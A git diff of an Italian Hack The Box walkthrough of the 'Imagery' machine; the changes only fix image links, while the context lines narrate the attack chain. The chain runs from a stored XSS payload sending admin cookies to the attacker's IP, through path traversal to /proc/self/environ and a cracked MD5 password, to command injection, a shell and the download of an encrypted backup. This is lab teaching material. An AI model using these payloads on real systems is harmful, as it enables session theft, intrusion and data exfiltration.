@@ -124,9 +124,9 @@ Nmap done: 1 IP address (1 host up) scanned in 97.01 seconds
 ## Sito http (porta 8000)
 ![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251115155315.png)
 ...
-![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251115160006.png)
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251115160006.png)
 Clicchiamo su `Report Bug`:
-![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251115160101.png)
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251115160101.png)
 La funzione `Report Bug` è immediatamente sospetta. I moduli che accettano input da parte dell'utente e che possono essere visualizzati da un utente privilegiato (come un amministratore) sono un classico punto di accesso per lo [[Stored Cross-Site Scripting]] (XSS).
 ### Accesso admin tramite XSS
 L'ipotesi è che un amministratore esamini periodicamente le segnalazioni di bug. Se riusciamo a inserire JavaScript nella segnalazione, questo verrà eseguito nel browser dell'amministratore, consentendoci di rubare il suo cookie di sessione.
@@ -136,7 +136,7 @@ Creiamo uno user con `register`:
 Email ID: `xerand@xerand.com`
 Password: `xerand`
 Poi effettuiamo il login
-![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251115155807.png)
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251115155807.png)
 
 1) Avviamo un listener sul nostro PC sulla porta 80, ascolteremo le richieste HTTP in entrata (`sudo nc -nlvp 80` o `python3 -m http.server 80`)
 2) Il payload efficace utilizza un tag <img> con un evento onerror che si attiva quando l'origine dell'immagine non è valida. `<img src=1 onerror="document.location='http://10.10.14.27/steal/'+document.cookie">` 
@@ -154,15 +154,15 @@ GET /steal/session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94
 La sessione è **.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aRiaZQ.5ayPLKNSIn_DGbFFqP9dgrnQXaE**
 
 Sostituiamo la nostra sessione con quella dell'amministratore appena trovato usando, i developer tools del browser (Storage/Cookie - Archiviazione/Cookie):
-![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251115163710.png)
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251115163710.png)
 Poi facciamo un refresh della pagina diventando amministratore. Ora dovremmo avere accesso all'endpoint /admin, che in precedenza era vietato.
 
-![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251115165950.png)
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251115165950.png)
 Ora intercettiamo con [[burpsuite]] il click su `Download Log` e sostituiamo 
 `log_identifier=admin%40imagery.htb.log` 
 con 
 `log_identifier=../../../../../../proc/self/environ`
-![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251115170808.png)
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251115170808.png)
 
 L’indirizzo **`/proc/self/environ`** è un file virtuale molto importante nel pentesting Linux, soprattutto quando si sfruttano vulnerabilità **LFI / RFI / log poisoning / privesc**.
 È un file virtuale del filesystem **/proc** che contiene **tutte le variabili d’ambiente** del **processo corrente**.
@@ -191,9 +191,9 @@ Da cui:
 
 Quindi è attiva il servizio **Flask**. In ambito **pentesting**, quando analizzi un’app Flask ci sono alcuni **file di configurazione** fondamentali che possono contenere informazioni sensibili o diventare vettori di attacco. Il primo è `config.py`.
 Con [[burpsuite]]proviamo ad esaminarlo (si trova all'indirizzo `/home/web/web/`):
-![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251115173853.png)
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251115173853.png)
 Troviamo `DATA_STORE_PATH = 'db.json'`. Esaminiamolo con [[burpsuite]]:
-![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251115181207.png)
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251115181207.png)
 Troviamo le password di `admin` e `testuser`. Quella di testuser è un hash MD5 crackabile con 
 https://crackstation.net/
 Troviamo la password: `iambatman`
@@ -202,9 +202,9 @@ mail: `testuser@imagery.htb`
 password: `iambatman`
 ### Remote Code Execution via Command Injection
 Esaminando il file `app.py` presente in `/home/web/web/` scopriamo diversi file da cui l'applicazione principale importa, tra cui `api_edit.py`
-![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251116133153.png)
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251116133153.png)
 Esaminando anche questo file troviamo questa parte dello script:
-![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251116134205.png)
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251116134205.png)
 
 La funzione `crop` trovata rivela il Santo Graal delle vulnerabilità web.
 ``` python
@@ -227,7 +227,7 @@ Otteniamo una shell come utente `web`
 Andiamo nella cartella `/tmp/` e scarichiamo [[linpeas]]dalla nostra macchina (`python3 -m http.server 3000` nella cartella che contiene linpeas sulla nostra macchina e `wget http://10.10.14.27:3000/lipeas.sh` nella cartella `/tmp/` della macchina vittima)
 Lanciamo [[linpeas]](`chmod +x linpeas.sh` e `./linpeas.sh`).
 Nelle cartelle `backup` troviamo il file `web_20250806_120723.zip.aes`
-![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%20251116143817.png)
+![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020251116143817.png)
 Lo scarichiamo sulla nostra macchina (`python3 -m http.server 3000` nella cartella che contiene `web_20250806_120723.zip.aes` sulla macchina vittima e `wget http://10.10.11.88:3000/web_20250806_120723.zip.aes` sulla nostra macchina)
 Il file è criptato con AES-Crypt, possiamo provare a decrittarlo con questo: 
 https://github.com/Nabeelcn25/dpyAesCrypt.py
